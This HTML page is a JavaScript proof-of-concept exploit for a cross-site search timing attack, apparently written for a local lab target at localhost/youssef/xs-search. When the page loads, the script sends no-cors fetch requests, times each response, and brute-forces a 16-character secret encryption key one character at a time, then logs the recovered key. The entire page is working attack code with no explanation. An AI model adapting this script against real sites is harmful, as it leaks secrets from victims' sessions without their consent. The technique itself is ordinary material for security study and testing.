<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <script>
      // Set the base URL for the search function
      const baseURL = "http://localhost/youssef/xs-search/xs-search.php";

      // Set the character set to brute-force (a-z, A-Z, 0-9)
      const charset =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

      // Set the encryption key length
      const keyLength = 16;

      // Initialize the encryption key
      let key = "Gx";

      // Function to send a search request using fetch
      async function search(keyword) {
        const start = performance.now();
        await fetch(`${baseURL}?q=${keyword}`, { mode: "no-cors" });
        const end = performance.now();
        return end - start;
      }

      // Function to brute-force the encryption key
      async function bruteForceKey() {
        for (let i = 0; i < keyLength; i++) {
          for (let char of charset) {
            const keyword = key + char;
            const responseTime = await search(keyword);
            if (responseTime > 300) {
              // adjust the threshold based on the timing difference
              key += char;
              console.log(`Found character ${i + 1}: ${char}`);
              break;
            }
          }
        }
        console.log(`Extracted encryption key: ${key}`);
      }

      bruteForceKey();
    </script>
  </body>
</html>
